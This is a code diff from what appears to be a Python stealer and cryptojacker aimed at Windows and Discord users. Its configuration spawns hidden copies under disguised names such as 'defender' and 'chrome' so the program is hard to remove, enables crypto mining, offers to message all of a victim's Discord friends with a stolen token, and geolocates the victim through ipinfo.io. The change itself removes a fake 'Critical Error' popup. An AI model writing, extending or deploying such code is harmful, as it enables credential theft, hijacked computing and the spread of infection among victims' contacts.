@@ -27,7 +27,6 @@ from Crypto.Cipher import AES
 from json import loads
 from regex import findall
 import platform
-from tkinter import messagebox
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import time
 import codecs
@@ -52,8 +51,6 @@ CLONE_PROCESS = True # Create Instances of the program hidden in multiple path.
 PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]
 PROCESS_NUM = 3 #3 is the perfect number,if you want your program to be un-removable put it a 5 maximum 
 
-FAKERROR = True #Show fake critical error 
-FAKERRMSG = "Exception at thread 0xSxZ3b78"
 MINE = True #Mine crypto? True/False
 
 DMALL_FRIENDS = False #Dm all friends in discord using token.
@@ -140,12 +137,6 @@ if yes == "yes":
 				threading.Thread(launchProcesses(str(os.getenv('APPDATA')) + "\\" + folderName + "\\" + rdmchoice+ ".exe")).start()
 		else:
 			print("[.] Already duplicated.")
-	def fakerrthread():
-		if(FAKERROR == True):
-			root = tk.Tk()
-			root.withdraw()
-			messagebox.showwarning("Critical Error", FAKERRMSG) 
-	threading.Thread(target=fakerrthread).start()
 	try:
 		url = 'http://ipinfo.io/json'
 		response = requests.get(url)
